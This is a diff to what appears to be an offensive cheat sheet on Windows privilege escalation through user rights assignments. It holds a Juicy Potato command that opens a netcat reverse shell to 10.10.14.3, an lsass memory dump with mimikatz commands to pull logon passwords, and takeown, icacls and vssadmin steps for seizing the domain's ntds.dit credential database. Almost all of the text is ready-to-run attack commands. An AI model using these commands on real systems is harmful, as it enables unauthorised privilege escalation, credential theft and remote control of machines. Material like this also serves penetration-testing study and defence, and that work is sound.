@@ -1,5 +1,6 @@
 # User Rights Assignment
 ```powershell
+RUN AS ADMINISTRATOR
 whoami /priv
 
 SeDebugPrivilege
@@ -38,4 +39,21 @@ function Enable-Privilege ([string]$privilegeName) {
 # Juicy Potato
 JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
 sudo nc -lnvp 8443
+```
+
+# SeDebugPrivilege
+```powershell
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+Ctrl + Shift + ESC --> lsass.exe --> Create Dump File
+```
+
+# SeTakeOwnershipPrivilege
+```powershell
+takeown /f C:\Windows\NTDS\ntds.dit
+icacls C:\Windows\NTDS\ntds.dit /grant %username%:F
+vssadmin create shadow /for=C:
 ```
